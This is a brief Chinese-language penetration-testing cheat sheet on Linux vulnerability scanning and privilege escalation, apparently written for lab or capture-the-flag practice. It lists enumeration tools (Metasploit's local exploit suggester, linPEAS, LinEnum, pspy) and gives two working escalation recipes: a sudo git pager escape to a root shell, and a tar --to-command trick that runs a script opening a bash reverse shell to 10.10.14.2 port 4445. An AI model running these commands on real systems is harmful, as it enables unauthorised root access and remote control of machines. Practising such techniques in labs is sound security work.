# Linux漏洞扫描与提权

## 漏洞扫描

- msf

```
use post/multi/recon/local_exploit_suggester
```

- **[windows-exploit-suggester.py](https://github.com/mxrmiss/Automation-script/blob/cb1807ed3582b9d965f77d048f5a8952a69ddd5d/Windows-Exploit-Suggester/Windows-Exploit-Suggester-master/windows-exploit-suggester.py)**
    - 需要安装pip2



- pspy

```
需要先给pspy脚本执行权力才能执行
```

- linPEAS

```
git clone https://github.com/mxrmiss/PEASS-ng.git
```



- LinEnum

```
git clone https://github.com/mxrmiss/LinEnum.git
```





## 提权

-  git

```
sudo git -p help config
# 末行模式下书写
!/bin/sh
```

-  tar

```
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.2/4445 0>&1' > xxx.sh
tar -cvf xxx.tar xxx.sh
sudo  -u onuma tar -xvf xxx.tar --to-command /bin/bash
```





